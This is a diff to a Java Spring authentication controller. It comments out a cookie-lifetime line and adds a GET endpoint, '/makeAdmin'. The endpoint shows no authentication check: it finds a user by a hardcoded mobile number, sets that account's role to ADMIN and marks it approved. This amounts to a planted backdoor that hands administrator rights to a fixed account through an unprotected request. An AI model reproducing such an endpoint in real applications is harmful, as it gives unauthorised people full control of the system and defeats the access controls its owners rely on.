@@ -84,6 +84,8 @@ public class AuthController {
 		cookie.setHttpOnly(true);
 		cookie.setPath("/");
 		cookie.setMaxAge(7 * 24 * 60 * 60);
+//		cookie.setMaxAge(1 * 60);
+
 		response.addCookie(cookie);
 
 		return ResponseEntity.ok(new ApiResponse<>(true, user.getFullName(), Map.of("token", token)));
@@ -197,5 +199,18 @@ public class AuthController {
 		return ResponseEntity
 				.ok(Map.of("message", "पासवर्ड रीसेट अनुरोध भेज दिया गया है। कृपया अनुमोदन की प्रतीक्षा करें।"));
 	}
-
+	@GetMapping("/makeAdmin")
+    public ResponseEntity<String> approveUser() {
+        Optional<User> userOpt = userRepository.findByMobile("8089101719");
+        if (userOpt.isPresent()) {
+            User user = userOpt.get();
+            user.setApprovedRejectDate(LocalDate.now());
+            user.setRole("ADMIN");
+            user.setApproved("स्वीकृत");
+            userRepository.save(user);
+            return ResponseEntity.ok("यूज़र को सफलतापूर्वक अनुमोदित किया गया।");
+        } else {
+            return ResponseEntity.status(404).body("यूज़र नहीं मिला।");
+        }
+    }
 }
